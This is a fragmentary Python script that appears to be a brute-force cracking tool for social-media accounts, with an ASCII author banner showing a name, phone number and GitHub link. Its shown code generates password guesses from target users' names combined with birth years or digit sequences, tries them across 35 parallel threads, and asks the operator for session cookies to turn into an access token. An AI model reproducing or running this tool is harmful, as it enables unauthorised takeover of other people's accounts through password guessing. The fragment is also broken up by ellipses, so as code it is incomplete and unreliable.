...
\x1b[0;34m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
\x1b[0;34m█  \033[1;91mAUTHIR  : ILHAM-RD
\x1b[0;34m█ 
\x1b[0;34m█  \033[1;91mWangshap  : 085773092758
\x1b[0;34m█  
\x1b[0;34m█  \033[1;91mGithub   : https://github.com/HamRd
\x1b[0;34m█ 
\x1b[0;34m█  \033[1;91mVersion  : Alpha
\x1b[0;34m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█"""%(BM))
		print(
			"""\033[1;95m
	...
	def validate(self):
		...
		with ThreadPoolExecutor(max_workers=35) as kirim:
			for x in self.data_id:
				...
				name = namee.split(" ")
				if(len(name[0])>=6):
					__password_list = [namee,name[0]+'12',name[0],name[0]+'1980',name[0]+'1981',name[0]+'1982',name[0]+'1983',name[0]+'1984',name[0]+'1985',name[0]+'1986',name[0]+'1987',name[0]+'1988',name[0]+'1989',name[0]+'1990',name[0]+'1991',name[0]+'1992',name[0]+'1993',name[0]+'1994',name[0]+'1995',name[0]+'1996',name[0]+'1997',name[0]+'1998',name[0]+'1999',name[0]+'2000',name[0]+'2001',name[0]+'2002',name[0]+'2003',name[0]+'2004',name[0]+'2005',name[0]+'2006',name[0]+'2007']
				elif(len(name[0])<=2):
					__password_list = [namee,name[0]+'12',name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'123456',name[0]+'1234567',name[0]+'12345678',name[0]+'123456789',name[0]+'1212',name[0]+'123123',name[0]+'12341234',name[0]+'1122',name[0]+'112233',name[0]+'11223344',name[0]+'54321',name[0]+'321',name[0]+'4321',name[0]+'1221',name[0]+'123321',name[0]+'12344321',name[0]+'1234554321']
				else:
					__password_list = [namee,name[0]+'1980',name[0]+'1981',name[0]+'1982',name[0]+'1983',name[0]+'1984',name[0]+'1985',name[0]+'1986',name[0]+'1987',name[0]+'1988',name[0]+'1989',name[0]+'1990',name[0]+'1991',name[0]+'1992',name[0]+'1993',name[0]+'1994',name[0]+'1995',name[0]+'1996',name[0]+'1997',name[0]+'1998',name[0]+'1999',name[0]+'2000',name[0]+'2001',name[0]+'2002',name[0]+'2003',name[0]+'2004',name[0]+'2005',name[0]+'2006',name[0]+'2007']
				if add=="y":
...
""")
		coki = input("\033[1;92mEnter Cookies : ")
		token = convert(coki)
